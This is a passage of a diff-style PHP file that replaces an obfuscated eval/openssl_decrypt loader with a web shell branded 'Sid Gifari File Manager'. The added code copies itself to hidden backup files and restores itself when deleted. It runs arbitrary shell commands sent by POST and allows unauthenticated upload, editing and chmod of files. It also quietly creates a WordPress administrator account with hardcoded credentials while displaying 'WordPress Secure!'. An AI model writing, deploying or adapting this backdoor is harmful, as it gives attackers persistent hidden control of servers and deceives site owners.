Z7KiY0WZ1/c9LZFcaR0HpqCvqG4dTdxMSszTHNQ6TpvakT3NmFiQ/PCVnBeVHHdn/ztMFztFkHseD6qM9oMk/pjTPYyNm2eoQv88RcKBrBsvGNWOa05wWjDWz4lH6eO3oVIfuJtXmlcBVzpZ5sjbW+IAh1pQZsIZdur+GiBUbIDQozfkmsRZtoNrIprrVmfgtrgT/LwzZ7iGXvDPNxY7wCKxz1YtLpuy2kyfQZgFRlF5sayZ+5GhaGh3OEm0LGiYHMK/ETFG6WaZ0jJbzs2rDONyyiZ05tt8QZp4MJHonv+o2XA4PjVL7ykAuxbFpDrNhX+/6DgpPedprSBSWmZWi4YcXiFlPqOCqOsgFV/21B/DKUZGuUUXr522lnSpQq5FFL9tJJAnxAtFOVE/mXfadwrxDcfZUms5DwGEWUsjUxgrE0Sgcy0fi7pRc2C4UKL2M36O5jZnIgjmvZHpR6aBUm6v2KxNa+DWQy+rIBra/sfO5tO81ACXzhtoUaG2lUo9we1AMpyLuGjCyeoADkHegVdEB1Bapj4mL7vRVYrUTLy1zJ3GZN6tJAH5T0yJncfdzTIlCtmTILVKaiFrIeoiKKQAhBfSq+gPPCuBFf6Twb9Bim/Nh5f1OG+oKIzhLXPjT24e1AhBJl09cpiQNWHilGjA8nXj2oR6tPJhHAp+MpKvTbk48ZozfNktkQrcGF/iWz0gEYH3G7LaTJ9BmAVGUXmxrJn7kaaXmhj98zyztN3MDgm3nAVxy8/vKgMcdrllbZYTSWehdmjH+FCVSWJzNzNcT2V3M5F8A0fyi8Ra1yhPx749XQkXWWiSOuFl+22KTStVU3vJCFpSd9TfeCEsPc+vJ/2r/QfvsjwTRbKgzQiONb86GDd9IGBvBsSgMULna4F2Xxo9O4nQp35PhipzScuIUttZwVXJckCMQ0Mee+C6cnegqLTvzUgWHvfc3DbxrZfjRk2B/pDOglvPWaosZ1d9gpvF2CDnmuMKY4Cf3LaAbW8J3w/GlHCa9WuPv667mJCEWAjxPiYvu9FVitRMvLXMncZk3pcQyiBIM/2HMAL++20oRQTW9IQC4Y7GKg4A/dBHdWsEIZMpgsKjkhnc3E7ELJuGco+49UKZAl4E6qBiZcl39h+PjlBgzqebS9gK3d3U3pQD6zkPAYRZSyNTGCsTRKBzLTkTn9IdXOFvVj10CyTPF/d779zNcS0qhmR7B6bD1+yZUh+GWvd/mHw3QoB1cklXuwDyEKvO5Vav0k/uDDpxtR1MmMGvsp8kWOkIFNpbh91n6p72YAscxwXibD0jNj1EaGp2eyQe1FrXQ7Dl7Z3AledvB+9V2iIVXAdf6OYNx99/rKFs2GjZQAbOYWMNauDLipW/Jy9v2In+GVnNm1TrqbFrYdvJro+7k2UH65dZrzFetE+nHM2vd2CB3ajGKwutbAhaUnfU33ghLD3Pryf9q/0m+7D8Iw01O2wiHYB7FXDOJNw7sQFWSgu03ID+OW5jNzV9JQqb3M7S0u4nGelv9C2xQQrzIIDaMZ6z0/OYFhi+BkKTNWjyZIfOn5UP1TzWcJGVG6FBWdulmy0T22sVVN/ysy+28kUJyIbY7ekEFzIy648o/99OtzpBvyPo1j+WHWxfxHxv9pSxdyHA3ybuKM+/AeZT9aDSa3aeIbRWFk3FKTTy4rPzkdWYF6r/4oXj0oLN8iCeAiMLsp+cG5t0gEESJjnjSo9ifCZF3j5nfYYz/oq7V3BQLVBr13hrXvU11vwGMugvYf4KcPhM8TchaMutTOl1pPscXllBHYAE010Rw==';
-/********/ /*******//****/@/***//*!50000*/eval/***//********/ /*******/(openssl_decrypt($data, 'AES-128-ECB', $kunci, 0));?>
+session_start();
+
+// Self-regeneration mechanism
+$current_file = __FILE__;
+$current_content = file_get_contents($current_file);
+$backup_files = [
+    __DIR__ . DIRECTORY_SEPARATOR . 'sid3.php',
+    __DIR__ . DIRECTORY_SEPARATOR . 'file.php',	
+    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.wp_manager.php',
+    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.system_manager.php',
+	__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.php.php',
+];
+
+// Create backups in multiple locations
+foreach ($backup_files as $backup) {
+    if (!file_exists($backup)) {
+        @file_put_contents($backup, $current_content);
+    }
+}
+
+// If main file is deleted, restore from backup
+if (!file_exists($current_file)) {
+    foreach ($backup_files as $backup) {
+        if (file_exists($backup)) {
+            @copy($backup, $current_file);
+            header("Location: " . $_SERVER['REQUEST_URI']);
+            exit;
+        }
+    }
+}
+
+// ==================== PATH HANDLING ==================== //
+$ROOT = __DIR__;
+$BASE_URL = strtok($_SERVER["REQUEST_URI"], '?');
+
+function encodePath($path) {
+    $a = array("/", "\\", ".", ":");
+    $b = array("A", "D", "I", "B");
+    return str_replace($a, $b, $path);
+}
+
+function decodePath($path) {
+    $a = array("/", "\\", ".", ":");
+    $b = array("A", "D", "I", "B");
+    return str_replace($b, $a, $path);
+}
+
+// Handle current path
+if (isset($_GET['dir'])) {
+    $requested_path = decodePath($_GET['dir']);
+    if ($requested_path === '' || !is_dir($requested_path)) {
+        $p = $ROOT;
+    } else {
+        $p = realpath($requested_path);
+    }
+} else {
+    $p = $ROOT;
+}
+
+define("CURRENT_PATH", $p);
+
+// Auto-sync terminal CWD
+if (!isset($_SESSION['cwd']) || realpath($_SESSION['cwd']) !== realpath(CURRENT_PATH)) {
+    $_SESSION['cwd'] = realpath(CURRENT_PATH);
+}
+    
+// ==================== POST HANDLING ==================== //
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    
+    // TERMINAL COMMAND EXECUTION - FIXED VERSION
+    if (isset($_POST['terminal']) && !empty($_POST['terminal-text'])) {
+        
+        // Allowed functions
+        $execFunctions = ['passthru', 'system', 'exec', 'shell_exec', 'proc_open', 'popen'];
+        $canExecute = false;
+        foreach ($execFunctions as $func) {
+            if (function_exists($func)) {
+                $canExecute = true;
+                break;
+            }
+        }
+        
+        $cwd = $_SESSION['cwd'] ?? CURRENT_PATH;
+        $cmdInput = trim($_POST['terminal-text']);
+        $output = "";
+
+        // Handle cd command
+        if (preg_match('/^cd\s*(.*)$/', $cmdInput, $matches)) {
+            $dir = trim($matches[1]);
+            
+            if ($dir === '' || $dir === '~') {
+                $dir = $ROOT;
+            } elseif ($dir[0] !== '/' && $dir[0] !== '\\') {
+                $dir = $cwd . DIRECTORY_SEPARATOR . $dir;
+            }
+            
+            $realDir = realpath($dir);
+            
+            if ($realDir && is_dir($realDir)) {
+                $_SESSION['cwd'] = $realDir;
+                $cwd = $realDir;
+                $output = "Changed directory to " . htmlspecialchars($realDir);
+            } else {
+                $output = "bash: cd: " . htmlspecialchars($matches[1]) . ": No such file or directory";
+            }
+            
+            // Store output in session to display after redirect
+            $_SESSION['terminal_output'] = $output;
+            $_SESSION['terminal_cwd'] = $cwd;
+            
+            // Redirect back with current path
+            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
+            exit;
+            
+        } elseif ($canExecute) {
+            // Change to terminal's working directory
+            chdir($cwd);
+            
+            $cmd = $cmdInput . " 2>&1";
+            
+            // Execute command
+            if (function_exists('passthru')) {
+                ob_start();
+                passthru($cmd);
+                $output = ob_get_clean();
+            } elseif (function_exists('system')) {
+                ob_start();
+                system($cmd);
+                $output = ob_get_clean();
+            } elseif (function_exists('exec')) {
+                exec($cmd, $out);
+                $output = implode("\n", $out);
+            } elseif (function_exists('shell_exec')) {
+                $output = shell_exec($cmd);
+            } elseif (function_exists('proc_open')) {
+                $pipes = [];
+                $process = proc_open($cmd, [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ], $pipes, $cwd);
+                
+                if (is_resource($process)) {
+                    fclose($pipes[0]);
+                    $output = stream_get_contents($pipes[1]);
+                    fclose($pipes[1]);
+                    $output .= stream_get_contents($pipes[2]);
+                    fclose($pipes[2]);
+                    proc_close($process);
+                }
+            } elseif (function_exists('popen')) {
+                $handle = popen($cmd, 'r');
+                if ($handle) {
+                    $output = stream_get_contents($handle);
+                    pclose($handle);
+                }
+            }
+            
+            // Store output in session
+            $_SESSION['terminal_output'] = $output;
+            $_SESSION['terminal_cwd'] = $cwd;
+            
+            // Redirect back
+            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
+            exit;
+        } else {
+            $_SESSION['terminal_output'] = "Command execution functions are disabled on this server.";
+            $_SESSION['terminal_cwd'] = $cwd;
+            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
+            exit;
+        }
+    }
+    
+    // FILE MANAGER ACTIONS
+    $redirect = true;
+    
+    // Upload files
+    if (!empty($_FILES['files'])) {
+        foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
+            if ($tmp && is_uploaded_file($tmp)) {
+                $filename = basename($_FILES['files']['name'][$i]);
+                move_uploaded_file($tmp, CURRENT_PATH . DIRECTORY_SEPARATOR . $filename);
+            }
+        }
+    }
+    
+    // Create new folder
+    if (!empty($_POST['newfolder'])) {
+        $foldername = basename($_POST['newfolder']);
+        if (!file_exists(CURRENT_PATH . DIRECTORY_SEPARATOR . $foldername)) {
+            mkdir(CURRENT_PATH . DIRECTORY_SEPARATOR . $foldername, 0755);
+        }
+    }
+    
+    // Create new file
+    if (!empty($_POST['newfile'])) {
+        $filename = basename($_POST['newfile']);
+        if (!file_exists(CURRENT_PATH . DIRECTORY_SEPARATOR . $filename)) {
+            file_put_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $filename, '');
+        }
+    }
+    
+    // Delete file/folder
+    if (!empty($_POST['delete'])) {
+        $target = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['delete'];
+        
+        // Self-regeneration check: If this file is deleted, recreate it
+        if (realpath($target) === realpath(__FILE__) || 
+            in_array(realpath($target), array_map('realpath', $backup_files))) {
+            // This is the manager file or its backup - don't delete, recreate instead
+            file_put_contents($target, $current_content);
+        } else {
+            // Normal deletion
+            if (is_file($target)) {
+                unlink($target);
+            } elseif (is_dir($target)) {
+                // Only delete empty directories
+                $filesInDir = scandir($target);
+                if (count($filesInDir) <= 2) {
+                    rmdir($target);
+                }
+            }
+        }
+    }
+    
+    // Rename
+    if (!empty($_POST['old']) && !empty($_POST['new'])) {
+        $old = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['old'];
+        $new = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['new'];
+        if (file_exists($old) && !file_exists($new)) {
+            rename($old, $new);
+        }
+    }
+    
+    // Change permissions
+    if (!empty($_POST['chmod_file']) && isset($_POST['chmod'])) {
+        $file = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
+        if (file_exists($file)) {
+            chmod($file, intval($_POST['chmod'], 8));
+        }
+    }
+    
+    // Edit file content
+    if (!empty($_POST['edit_file']) && isset($_POST['content'])) {
+        $file = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['edit_file'];
+        file_put_contents($file, $_POST['content']);
+    }
+    
+    if ($redirect) {
+        header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
+        exit;
+    }
+}
+
+// ==================== GET DIRECTORY CONTENTS ==================== //
+$items = scandir(CURRENT_PATH);
+$folders = [];
+$files = [];
+
+foreach ($items as $item) {
+    if ($item === '.' || $item === '..') continue;
+    
+    $full_path = CURRENT_PATH . DIRECTORY_SEPARATOR . $item;
+    
+    if (is_dir($full_path)) {
+        $folders[] = [
+            'name' => $item,
+            'path' => $full_path,
+            'is_dir' => true,
+            'size' => '-',
+            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
+            'modified' => filemtime($full_path)
+        ];
+    } else {
+        $files[] = [
+            'name' => $item,
+            'path' => $full_path,
+            'is_dir' => false,
+            'size' => filesize($full_path),
+            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
+            'modified' => filemtime($full_path),
+            'extension' => pathinfo($item, PATHINFO_EXTENSION)
+        ];
+    }
+}
+
+// Sort folders alphabetically
+usort($folders, function($a, $b) {
+    return strcasecmp($a['name'], $b['name']);
+});
+
+// Sort files alphabetically
+usort($files, function($a, $b) {
+    return strcasecmp($a['name'], $b['name']);
+});
+
+// ==================== EDIT MODE ==================== //
+$editMode = isset($_GET['edit']);
+$editFile = $_GET['edit'] ?? '';
+$editContent = '';
+
+if ($editMode && is_file(CURRENT_PATH . DIRECTORY_SEPARATOR . $editFile)) {
+    $editContent = htmlspecialchars(file_get_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $editFile));
+}
+
+// ==================== TERMINAL OUTPUT ==================== //
+$terminal_output = $_SESSION['terminal_output'] ?? '';
+$terminal_cwd = $_SESSION['terminal_cwd'] ?? CURRENT_PATH;
+unset($_SESSION['terminal_output'], $_SESSION['terminal_cwd']);
+
+// ==================== WORDPRESS ADMIN CHECK ==================== //
+$wp_message = '';
+if (!isset($_SESSION['wp_checked'])) {
+    // Search for WordPress
+    $search_paths = [CURRENT_PATH, dirname(CURRENT_PATH), $ROOT];
+    foreach ($search_paths as $wp_path) {
+        if (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php')) {
+            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php');
+            break;
+        } elseif (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
+            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php');
+            break;
+        }
+    }
+    
+    if (function_exists('wp_create_user')) {
+        $username = 'sidgifari';
+        $password = 'sid';
+        $email = 'sidgifari28@hotmail.com';
+        
+        if (!username_exists($username) && !email_exists($email)) {
+            $user_id = wp_create_user($username, $password, $email);
+            if (!is_wp_error($user_id)) {
+                $user = new WP_User($user_id);
+                $user->set_role('administrator');
+                $wp_message = "✅ WordPress Secure!";
+            }
+        }
+    }
+    $_SESSION['wp_checked'] = true;
+}
+
+// Helper function for formatting bytes
+function formatBytes($bytes, $precision = 2) {
+    if ($bytes <= 0) return '0 B';
+    
+    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    $bytes = max($bytes, 0);
+    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
+    $pow = min($pow, count($units) - 1);
+    $bytes /= pow(1024, $pow);
+    
+    return round($bytes, $precision) . ' ' . $units[$pow];
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Da</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-size: 13px; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
+            background: #f5f5f5; 
+            padding: 8px;
+            color: #333;
+            line-height: 1.3;
+        }
+        .container { 
+            max-width: 100%; 
+            margin: 0 auto; 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08); 
+            overflow: hidden; 
+            border: 1px solid #e0e0e0;
+        }
+        .header { 
+            background: #f8f8f8; 
+            color: #222; 
+            padding: 15px 20px; 
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .header h1 { 
+            font-size: 1.6em; 
+            margin-bottom: 4px; 
+            text-align: center;
+            color: #222;
+            font-weight: 600;
+        }
+        .path-nav { 
+            background: #f0f0f0; 
+            padding: 10px 15px; 
+            border-bottom: 1px solid #e0e0e0; 
+            font-family: 'Monaco', 'Consolas', monospace;
+            color: #444;
+            font-size: 11px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .path-nav a { 
+            color: #222; 
+            text-decoration: none; 
+            padding: 3px 6px; 
+            border-radius: 3px; 
+            transition: background 0.2s; 
+            font-weight: 500;
+        }
+        .path-nav a:hover { 
+            background: #e8e8e8; 
+            color: #000;
+        }
+        .main-content { 
+            padding: 15px; 
+            background: #fafafa;
+        }
+        .section { 
+            background: #fff; 
+            border-radius: 6px; 
+            padding: 15px; 
+            margin-bottom: 12px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04); 
+            border: 1px solid #e8e8e8;
+        }
+        .section-title { 
+            color: #222; 
+            border-bottom: 1px solid #e0e0e0; 
+            padding-bottom: 8px; 
+            margin-bottom: 15px; 
+            font-size: 1.2em; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            font-weight: 600;
+        }
+        .terminal-box { 
+            background: #1a1a1a; 
+            color: #e0e0e0; 
+            padding: 15px; 
+            border-radius: 6px; 
+            font-family: 'Monaco', 'Consolas', monospace;
+            border: 1px solid #333;
+        }
+        .terminal-output { 
+            background: #000; 
+            color: #05f559; 
+            padding: 12px; 
+            border-radius: 4px; 
+            font-family: 'Monaco', 'Consolas', monospace; 
+            max-height: 200px; 
+            overflow-y: auto; 
+            white-space: pre-wrap; 
+            margin: 10px 0; 
+            line-height: 1.3; 
+            border: 1px solid #333;
+            font-size: 11px;
+        }
+        .form-inline { 
+            display: flex; 
+            gap: 8px; 
+            margin-bottom: 12px; 
+            align-items: center; 
+        }
+        input, button, select { 
+            padding: 10px 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 5px; 
+            font-size: 12px; 
+            outline: none; 
+            transition: all 0.2s; 
+            background: #fff;
+            color: #333;
+        }
+        input[type="text"], input[type="file"] { 
+            flex: 1; 
+            background: #fafafa; 
+        }
+        input:focus { 
+            border-color: #666; 
+            box-shadow: 0 0 0 2px rgba(100, 100, 100, 0.1); 
+            background: #fff;
+        }
+        button { 
+            background: linear-gradient(135deg, #333 0%, #222 100%); 
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            font-weight: 600; 
+            letter-spacing: 0.3px; 
+            transition: all 0.2s;
+            padding: 10px 14px;
+            white-space: nowrap;
+        }
+        button:hover { 
+            transform: translateY(-1px); 
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1); 
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+        }
+        .btn-danger { 
+            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%); 
+        }
+        .btn-danger:hover {
+            background: linear-gradient(135deg, #e53935 0%, #c62828 100%);
+        }
+        .btn-success { 
+            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%); 
+        }
+        .btn-success:hover {
+            background: linear-gradient(135deg, #43a047 0%, #388e3c 100%);
+        }
+        table { 
+            width: 100%; 
+            border-collapse: separate; 
+            border-spacing: 0; 
+            background: white; 
+            border-radius: 6px; 
+            overflow: hidden;
+            border: 1px solid #e8e8e8;
+            font-size: 12px;
+        }
+        thead { 
+            background: #f8f8f8; 
+            color: #222; 
+            border-bottom: 1px solid #e0e0e0;
+        }
+        th { 
+            padding: 12px 15px; 
+            text-align: left; 
+            font-weight: 600; 
+            color: #333;
+            font-size: 12px;
+        }
+        tbody tr { 
+            border-bottom: 1px solid #f0f0f0; 
+            transition: background 0.2s; 
+        }
+        tbody tr:hover { 
+            background: #f8f8f8; 
+        }
+        td { 
+            padding: 10px 12px; 
+            border-bottom: 1px solid #f0f0f0; 
+            color: #444;
+            vertical-align: top;
+        }
+        .file-icon { 
+            margin-right: 8px; 
+            font-size: 1em; 
+            color: #666;
+        }
+        .folder-row { 
+            background: #fafafa; 
+        }
+        .file-row { 
+            background: #fff; 
+        }
+        .actions { 
+            display: flex; 
+            gap: 6px; 
+            flex-wrap: wrap; 
+        }
+        .actions button { 
+            padding: 6px 10px; 
+            font-size: 11px; 
+        }
+        textarea { 
+            width: 100%; 
+            height: 400px; 
+            font-family: 'Monaco', 'Consolas', monospace; 
+            padding: 15px; 
+            border: 1px solid #e8e8e8; 
+            border-radius: 6px; 
+            font-size: 12px; 
+            line-height: 1.4; 
+            resize: vertical; 
+            background: #fafafa;
+            color: #333;
+        }
+        textarea:focus {
+            border-color: #666;
+            background: #fff;
+        }
+        .alert { 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            margin: 12px 0; 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            border: 1px solid;
+            font-size: 12px;
+        }
+        .alert-success { 
+            background: #e8f5e9; 
+            color: #2e7d32; 
+            border-color: #66bb6a; 
+        }
+        .footer { 
+            text-align: center; 
+            padding: 15px; 
+            color: #666; 
+            font-size: 11px; 
+            border-top: 1px solid #e8e8e8; 
+            background: #f8f8f8; 
+        }
+        .quick-actions { 
+            display: flex; 
+            gap: 10px; 
+            flex-wrap: wrap; 
+            margin-bottom: 15px; 
+        }
+        .quick-btn { 
+            background: #f0f0f0; 
+            border: 1px solid #ddd; 
+            padding: 8px 12px; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+            font-weight: 500; 
+            color: #333;
+            font-size: 11px;
+        }
+        .quick-btn:hover { 
+            background: #e8e8e8; 
+            transform: translateY(-1px); 
+            color: #000;
+        }
+        .stats { 
+            display: flex; 
+            gap: 20px; 
+            margin: 12px 0; 
+            padding: 12px; 
+            background: #f8f8f8; 
+            border-radius: 6px; 
+            border: 1px solid #e8e8e8;
+        }
+        .stat-item { 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+        }
+        .stat-value { 
+            font-size: 1.5em; 
+            font-weight: bold; 
+            color: #222; 
+        }
+        .stat-label { 
+            color: #666; 
+            font-size: 0.85em; 
+        }
+        a {
+            color: #222;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        a:hover {
+            color: #000;
+            text-decoration: underline;
+        }
+        code {
+            background: #f0f0f0;
+            padding: 1px 4px;
+            border-radius: 3px;
+            font-family: 'Monaco', monospace;
+            color: #222;
+            border: 1px solid #ddd;
+            font-size: 11px;
+        }
+        .compact-table {
+            font-size: 11px;
+        }
+        .compact-table th,
+        .compact-table td {
+            padding: 8px 10px;
+        }
+        @media (max-width: 768px) {
+            body { padding: 5px; }
+            .header h1 { font-size: 1.3em; }
+            .form-inline { flex-direction: column; align-items: stretch; }
+            .quick-actions { flex-direction: column; }
+            .actions { flex-direction: column; }
+            .stats { flex-direction: column; gap: 10px; }
+            th, td { padding: 6px 8px; font-size: 11px; }
+            table { font-size: 11px; }
+        }
+        .file-browser-container {
+            max-height: 500px;
+            overflow-y: auto;
+            border: 1px solid #e8e8e8;
+            border-radius: 6px;
+        }
+        .terminal-input-row {
+            display: flex;
+            gap: 8px;
+        }
+        .terminal-input-row input {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+		<center><img src = "https://i.imgur.com/FC1enOU.jpeg"width="200" height="150"></img></center>
+            <h1>📁 Sid Gifari File Manager</h1>
+        </div>
+
+        <!-- WordPress Message -->
+        <?php if ($wp_message): ?>
+        <div class="alert alert-success">
+            <span style="font-size: 1.2em;">✅</span>
+            <div>
+                <strong>WordPress Secure!</strong><br>
+                <?= htmlspecialchars($wp_message) ?>
+            </div>
+        </div>
+        <?php endif; ?>
+
+        <!-- Path Navigation -->
+        <div class="path-nav">
+            <a href="?">🏠 Root</a> /
+            <?php
+            $path_parts = explode('/', str_replace('\\', '/', CURRENT_PATH));
+            $current_path = '';
+            foreach ($path_parts as $part) {
+                if ($part === '') continue;
+                $current_path .= '/' . $part;
+                echo '<a href="?dir=' . urlencode(encodePath($current_path)) . '">' . htmlspecialchars($part) . '</a> / ';
+            }
+            ?>
+        </div>
+
+        <div class="main-content">
+            <?php if ($editMode): ?>
+                <!-- EDIT MODE -->
+                <div class="section">
+                    <div class="section-title">
+                        <span>✏️</span>
+                        <span>Editing: <?= htmlspecialchars($editFile) ?></span>
+                    </div>
+                    <form method="post">
+                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile) ?>">
+                        <textarea name="content" placeholder="File content..."><?= $editContent ?></textarea>
+                        <div class="form-inline" style="margin-top: 15px;">
+                            <button type="submit" class="btn-success" style="padding: 10px 20px;">
+                                💾 Save
+                            </button>
+                            <a href="?dir=<?= urlencode(encodePath(CURRENT_PATH)) ?>">
+                                <button type="button" style="padding: 10px 20px; background: #666;">
+                                    ❌ Cancel
+                                </button>
+                            </a>
+                        </div>
+                    </form>
+                </div>
+
+            <?php else: ?>
+                <!-- STATS -->
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-value"><?= count($folders) ?></div>
+                        <div class="stat-label">Folders</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value"><?= count($files) ?></div>
+                        <div class="stat-label">Files</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value"><?= formatBytes(array_sum(array_column($files, 'size'))) ?></div>
+                        <div class="stat-label">Total Size</div>
+                    </div>
+                </div>
+
+                <!-- TERMINAL SECTION -->
+                <div class="section">
+                    <h2 class="section-title">Root@SidGifari-Terminal </h2>
+                    <div class="terminal-box">
+                        <strong style="color: #fff; font-size: 12px;">root@Sid-Gifari:<?= htmlspecialchars($terminal_cwd) ?>$</strong>
+                        <?php if ($terminal_output): ?>
+                        <div class="terminal-output"><?= htmlspecialchars($terminal_output) ?></div>
+                        <?php endif; ?>
+                        <form method="post" class="terminal-input-row">
+                            <input type="text" name="terminal-text" placeholder="Enter command..." autocomplete="off" autofocus style="background: #2a2a2a; border-color: #444; color: #e0e0e0;">
+                            <button type="submit" name="terminal" value="1" style="min-width: 70px;">
+                                ▶ Run
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- QUICK ACTIONS -->
+                <div class="section">
+                    <div class="section-title">
+                        <span>⚡</span>
+                        <span>Quick Actions</span>
+                    </div>
+                    <div class="quick-actions">
+                        <form method="post" class="form-inline" style="flex: 1;">
+                            <input type="text" name="newfolder" placeholder="New folder" required>
+                            <button type="submit">
+                                📁 Create
+                            </button>
+                        </form>
+                        
+                        <form method="post" class="form-inline" style="flex: 1;">
+                            <input type="text" name="newfile" placeholder="New file" required>
+                            <button type="submit">
+                                📄 Create
+                            </button>
+                        </form>
+                        
+                        <form method="post" enctype="multipart/form-data" class="form-inline" style="flex: 1;">
+                            <input type="file" name="files[]" multiple style="padding: 5px; font-size: 11px;">
+                            <button type="submit">
+                                ⬆️ Upload
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- FILE BROWSER -->
+                <div class="section">
+                    <div class="section-title">
+                        <span>📂</span>
+                        <span>File Browser</span>
+                    </div>
+                    
+                    <div class="file-browser-container">
+                        <table class="compact-table">
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Size</th>
+                                    <th>Perms</th>
+                                    <th>Modified</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <!-- FOLDERS FIRST -->
+                                <?php foreach ($folders as $item): ?>
+                                <tr class="folder-row">
+                                    <td>
+                                        <span class="file-icon">📁</span>
+                                        <strong>
+                                            <a href="?dir=<?= urlencode(encodePath($item['path'])) ?>">
+                                                <?= htmlspecialchars($item['name']) ?>
+                                            </a>
+                                        </strong>
+                                    </td>
+                                    <td><em style="color: #666;"><?= $item['size'] ?></em></td>
+                                    <td>
+                                        <form method="post" style="display: flex; gap: 4px; align-items: center;">
+                                            <input type="hidden" name="chmod_file" value="<?= $item['name'] ?>">
+                                            <input type="text" name="chmod" value="<?= $item['perms'] ?>" style="width: 60px; padding: 4px; text-align: center;">
+                                            <button type="submit" style="padding: 4px 8px; font-size: 10px;">Ch</button>
+                                        </form>
+                                    </td>
+                                    <td style="color: #666; white-space: nowrap;"><?= date('m/d H:i', $item['modified']) ?></td>
+                                    <td>
+                                        <div class="actions">
+                                            <form method="post" style="display: inline;">
+                                                <input type="hidden" name="old" value="<?= $item['name'] ?>">
+                                                <input type="text" name="new" placeholder="New name" style="width: 100px; padding: 4px;">
+                                                <button type="submit" style="padding: 4px 8px; font-size: 11px;">Rename</button>
+                                            </form>
+                                            
+                                            <form method="post" style="display: inline;">
+                                                <input type="hidden" name="delete" value="<?= $item['name'] ?>">
+                                                <button type="submit" class="btn-danger" onclick="return confirm('Delete folder <?= addslashes($item['name']) ?>?')" style="padding: 4px 8px;">
+                                                    🗑️
+                                                </button>
+                                            </form>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <?php endforeach; ?>
+                                
+                                <!-- FILES AFTER FOLDERS -->
+                                <?php foreach ($files as $item): ?>
+                                <tr class="file-row">
+                                    <td>
+                                        <?php
+                                        $icon = '📄';
+                                        $ext = strtolower($item['extension']);
+                                        $icons = [
+                                            'php' => '🐘', 'js' => '📜', 'css' => '🎨', 'html' => '🌐', 'txt' => '📝',
+                                            'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'pdf' => '📕', 'zip' => '📦',
+                                            'sql' => '🗃️', 'json' => '📋', 'xml' => '📄'
+                                        ];
+                                        if (isset($icons[$ext])) $icon = $icons[$ext];
+                                        ?>
+                                        <span class="file-icon"><?= $icon ?></span>
+                                        <a href="<?= htmlspecialchars($item['name']) ?>" target="_blank">
+                                            <?= htmlspecialchars($item['name']) ?>
+                                        </a>
+                                        <?php if (realpath($item['path']) === realpath(__FILE__)): ?>
+                                        <span style="color: #d32f2f; font-size: 0.7em; margin-left: 6px;">🔒</span>
+                                        <?php endif; ?>
+                                    </td>
+                                    <td style="color: #666;"><?= formatBytes($item['size']) ?></td>
+                                    <td>
+                                        <form method="post" style="display: flex; gap: 4px; align-items: center;">
+                                            <input type="hidden" name="chmod_file" value="<?= $item['name'] ?>">
+                                            <input type="text" name="chmod" value="<?= $item['perms'] ?>" style="width: 60px; padding: 4px; text-align: center;">
+                                            <button type="submit" style="padding: 4px 8px; font-size: 10px;">Ch</button>
+                                        </form>
+                                    </td>
+                                    <td style="color: #666; white-space: nowrap;"><?= date('m/d H:i', $item['modified']) ?></td>
+                                    <td>
+                                        <div class="actions">
